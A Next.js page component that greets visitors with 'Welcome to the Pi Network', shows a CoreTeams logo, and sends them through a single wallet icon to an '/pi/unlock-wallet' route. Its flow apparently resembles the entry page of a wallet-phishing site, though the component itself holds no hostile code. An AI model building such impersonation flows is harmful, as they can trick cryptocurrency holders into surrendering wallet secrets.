"use client";

import Link from "next/link";
import Image from "next/image";
import styles from "./ValidatePage.module.css";
import {
  Blockchain,
  Brainstorm,
  Chat,
  Exchange,
  Fireside,
  Kyc,
  Mine,
  Wallet,
} from "@/component/Pi-icon";

const ValidatePage = () => {
  return (
    <div className={styles.validatePage}>
      {/* Top Bar */}
      <div className={styles.topBar}>
        <div className={styles.topBarContent}>
          <Link href="/" className={styles.withText}>
            Home
            {/* <Image
              src="https://www.coreteams.net/_next/image?url=%2Fimages%2Flogo.png&w=128&q=75"
              alt="CoreTeams Logo"
              className={styles.logo}
              width={128}
              height={40}
            /> */}
          </Link>
        </div>
      </div>

      {/* Main Content */}
      <div className={styles["icon-container"]}>
        <div className={styles["logo-container"]}>
          <Image
            src="https://www.coreteams.net/_next/image?url=%2Fimages%2Flogo.png&w=128&q=75"
            alt="CoreTeams Logo"
            width={128}
            height={40}
          />
        </div>

        <h1 className={styles.welcomeText}>Welcome to the Pi Network</h1>
        <p className={styles.instructionText}>
          Click the wallet icon below to continue
        </p>

        <div className={styles.singleIconContainer}>
          <Link href="/pi/unlock-wallet" className={styles["icon-item"]}>
            <div className={styles["icon-wrapper"]}>
              <Wallet />
            </div>
            <span>Wallet</span>
          </Link>
        </div>

        <button className={styles["explore-button"]}>
          <span className={styles["button-icon"]}>↗</span>
          Explore our Exchange
        </button>
      </div>
    </div>
  );
};

export default ValidatePage;
